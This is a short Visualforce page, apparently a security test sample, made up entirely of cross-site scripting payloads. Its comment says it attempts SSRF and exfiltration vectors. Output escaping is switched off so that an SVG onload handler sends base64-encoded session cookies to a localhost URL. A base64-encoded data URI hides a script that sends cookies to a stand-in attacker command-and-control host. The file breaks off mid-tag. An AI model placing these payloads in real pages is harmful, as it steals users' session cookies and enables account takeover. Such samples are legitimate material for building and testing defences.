<apex:page showHeader="false" sidebar="false" contentType="text/html">
    <!-- This page attempts multiple SSRF and data exfiltration vectors -->

    <!-- SVG-based XSS -->
    <apex:outputText escape="false" value="
        <svg onload='fetch(\"https://localhost:8080/svg-xss?c=\"+btoa(document.cookie))'>
        </svg>
    "/>

    <!-- Data URI injection -->
    <apex:outputText escape="false" value="
        <object data='data:text/html;base64,PHNjcmlwdD5mZXRjaCgiaHR0cHM6Ly9hdHRhY2tlci1jMi5leGFtcGxlLmNvbS9kYXRhLXVyaT9jPSIrYnRvYShkb2N1bWVudC5jb29raWUpKTwvc2NyaXB0Pg=='></object>
